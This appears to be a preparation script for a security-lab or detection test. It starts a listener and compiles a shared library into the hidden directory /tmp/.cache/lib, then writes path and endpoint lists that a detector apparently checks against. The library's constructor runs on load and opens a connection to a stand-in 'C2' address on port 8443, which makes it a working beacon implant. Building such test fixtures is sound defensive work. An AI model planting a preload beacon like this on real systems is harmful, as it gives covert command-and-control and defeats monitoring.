#!/usr/bin/env bash
# prepare（窗口外）：编译与监听端就绪，攻击动作零发生。
set -euo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
C2_IP="${SECLAB_C2_IP:-198.51.100.50}"
bash "$HERE/common/start_listener.sh" 8443
mkdir -p /tmp/.cache/lib
cc -O2 -Wall -shared -fPIC -o /tmp/.cache/lib/libpreload.so -x c - <<'EC'
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
__attribute__((constructor)) static void beacon(void) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in a = {0}; a.sin_family = AF_INET; a.sin_port = htons(8443);
    inet_pton(AF_INET, "198.51.100.50", &a.sin_addr);
    if (connect(fd, (struct sockaddr *)&a, sizeof(a)) == 0) close(fd);
}
EC
cp /tmp/.cache/lib/libpreload.so .  # 工作区副本：哈希锚定+包归属反证进入可查面（2026-10-12 收尾项）
printf "/tmp/.cache/lib\n" > watch_paths.txt
: > approved_endpoints.txt
printf "/tmp/.cache/lib/libpreload.so\n" > system_paths.txt
